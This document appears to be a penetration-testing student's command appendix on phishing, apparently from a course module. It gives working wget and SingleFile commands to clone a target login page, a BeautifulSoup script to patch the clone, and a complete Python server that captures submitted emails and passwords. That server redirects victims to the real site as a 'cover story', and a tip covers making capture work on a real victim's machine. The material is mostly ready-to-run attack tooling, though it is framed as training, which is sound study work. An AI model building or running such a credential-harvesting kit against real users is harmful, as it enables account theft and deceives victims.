# Phishing, Command Appendix

Part of [[COMMAND APPENDIX]]. Website cloning, clone-patching, and credential capture.

---

## Cloning a Target Login Page

```bash
# First attempt: wget (fast, but only grabs raw HTML/JS, doesn't execute anything).
# Commonly breaks on pages with CSRF-protected external JS includes.
mkdir ~/ClonedSite && cd ~/ClonedSite
wget -E -k -K -p -e robots=off -nd "https://<target-login-url>"

# If wget's clone throws a JS/CSRF error when served locally, switch to SingleFile CLI,
# which drives real headless Chromium and captures the fully-rendered page (JS included)
sudo apt install nodejs npm chromium -y
sudo npm install -g single-file-cli
single-file "https://<target-login-url>" signin.html --browser-executable-path /usr/bin/chromium
```
*`wget` flags: `-E` fixes file extensions to match content-type, `-k` rewrites links to local paths, `-K` keeps a `.orig` backup, `-p` grabs every asset needed to render the page, `-e robots=off` ignores `robots.txt`, `-nd` flattens output into one directory instead of nested folders.*

See [[11. Phishing Basics#11.3.2. Cloning a Legitimate Website|11.3.2]].

#### Tags: #Wget #SingleFileCLI #WebsiteCloning

---

## Patching a Cloned Page (BeautifulSoup)

```python
from bs4 import BeautifulSoup

with open('signin.html','r') as f:
    html = f.read()

soup = BeautifulSoup(html, "html.parser")

# Remove broken cookie-consent / dead-JS elements by ID
for elem_id in ["onetrust-consent-sdk", "onetrust-banner-sdk"]:  # match actual IDs on target page
    elem = soup.find(id=elem_id)
    if elem:
        elem.decompose()

# Wire up a button's onclick (or any attribute), robust regardless of the source HTML's quoting/attribute order
btn = soup.find(id="<button-id>")
if btn:
    btn['onclick'] = 'goToPassword()'

with open('signin.html','w') as f:
    f.write(str(soup))
```
*Use BeautifulSoup's `.find(id=...)` + attribute assignment, not raw string-replace, to modify a cloned page. Raw string-replace (`html.replace('id="foo"'...)`) is fragile against attribute-quoting/ordering differences between what a reference walkthrough shows and what your actual clone captured, `.find()` normalizes all of that during parsing.*

See [[11. Phishing Basics#11.3.3. Cleaning Up the Clone|11.3.3]], [[Phishing (Breakdowns)|Command Breakdowns]] for the full quoting-fragility lesson.

#### Tags: #BeautifulSoup #HTMLPatching #Python

---

## Credential Capture Server

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        data = parse_qs(raw)
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        print(f'Email: {email}  Password: {password}')
        self.send_response(302)
        self.send_header('Location', 'https://<real-site>/signin')  # cover story: looks like login failed
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```
*Listens on `0.0.0.0`, not `127.0.0.1`, so it accepts connections from other machines on the network, not just localhost. Redirecting to the real site's login page after capture is the standard cover story, the victim just thinks their login failed and tries again (maybe with their real password this time).*

> **Gotcha:** the cloned page's form `action` must point at your actual reachable IP (VPN/tun0), not `127.0.0.1`. Works fine testing locally, silently fails once a real victim on a different machine opens the page, since `127.0.0.1` in their browser means *their* machine.

See [[11. Phishing Basics#11.3.4. Capturing Credentials|11.3.4]] and [[Phishing (Breakdowns)#Why 127.0.0.1 breaks once a real victim machine is involved|Command Breakdowns]].

#### Tags: #CredentialCapture #PythonHTTPServer #Phishing

---

## **Outstanding**
This area grows alongside the module. Whenever a new phishing delivery/capture technique comes up (MFA-aware capture pages, GoPhish/Evilginx2 usage, etc), add it here with a link back to the source section.
## External Resources

- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
